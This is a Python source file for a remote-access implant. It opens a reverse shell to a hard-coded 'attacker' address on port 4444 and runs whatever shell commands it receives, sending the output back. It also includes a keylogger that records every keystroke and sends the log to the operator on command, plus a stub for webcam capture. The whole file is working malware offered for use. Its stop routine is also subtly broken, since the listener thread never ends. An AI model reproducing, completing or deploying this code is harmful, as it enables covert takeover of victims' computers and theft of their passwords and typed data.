import socket
import subprocess
import time
from pynput import keyboard
import threading

# Variable to hold the recorded keystrokes
keystrokes = []

# Function to capture keystrokes
def on_press(key):
    try:
        # Append the pressed key to the keystrokes list
        keystrokes.append(str(key.char))
    except AttributeError:
        # Handle special keys (like shift, ctrl, etc.)
        keystrokes.append(f'[{key}]')

# Function to start the keylogger
def start_keylogger():
    # Set up the listener for the keyboard
    with keyboard.Listener(on_press=on_press) as listener:
        listener.join()

# Function to dump the captured keystrokes
def dump_keylogs():
    return ''.join(keystrokes)

# Keylogger control flags
keylogger_active = False
keylogger_thread = None

# Change these to your attacker's IP and port
attacker_ip = '10.0.1.12'  # Replace with your attacker's IP
attacker_port = 4444         # Same port number as the attacker's listener

# Connect back to the attacker's machine
client = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
client.connect((attacker_ip, attacker_port))

# Receive commands from the attacker and execute them
while True:
    command = client.recv(1024).decode('utf-8')

    if command.lower() == 'exit':
        break
    elif command.lower() == 'webcam_snap':
        # Function to capture the webcam snapshot (same as previous example)
        print("Capturing webcam image...")
        # Here we assume you have a function to capture a webcam image
        # Send the image data back (base64-encoded)
        pass  # Add the webcam capture code here if needed
    elif command.lower() == 'key_start':
        # Start the keylogger
        if not keylogger_active:
            print("Starting keylogger...")
            keylogger_active = True
            keylogger_thread = threading.Thread(target=start_keylogger)
            keylogger_thread.start()
            client.send(b'Keylogger started')
        else:
            client.send(b'Keylogger is already running.')
    elif command.lower() == 'key_dump':
        # Dump the recorded keystrokes
        if keystrokes:
            keylogs = dump_keylogs()
            client.send(keylogs.encode('utf-8'))
        else:
            client.send(b'No keylogs recorded.')
    elif command.lower() == 'key_stop':
        # Stop the keylogger
        if keylogger_active:
            keylogger_active = False
            if keylogger_thread:
                keylogger_thread.join()
            client.send(b'Keylogger stopped')
        else:
            client.send(b'Keylogger is not running.')
    else:
        # Execute regular shell command
        output = subprocess.run(command, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
        result = output.stdout + output.stderr
        client.send(result)

# Close the connection after executing the command
client.close()
